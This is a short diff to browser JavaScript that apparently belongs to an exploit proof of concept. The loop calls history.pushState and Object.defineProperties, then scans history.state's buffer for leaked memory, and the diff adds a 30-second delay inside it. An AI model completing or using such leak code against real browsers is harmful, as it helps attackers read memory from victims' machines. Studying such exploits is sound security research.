@@ -138,6 +138,7 @@ var maxCount=254;
 while(foundLeak==undefined&&maxCount>0){
 
 history.pushState(y,"");
+  delay(30000);
 Object.defineProperties({},props);
 var leak=new Uint32Array(history.state.data.buffer);
 for(var i=0;i<leak.length-6;i++){
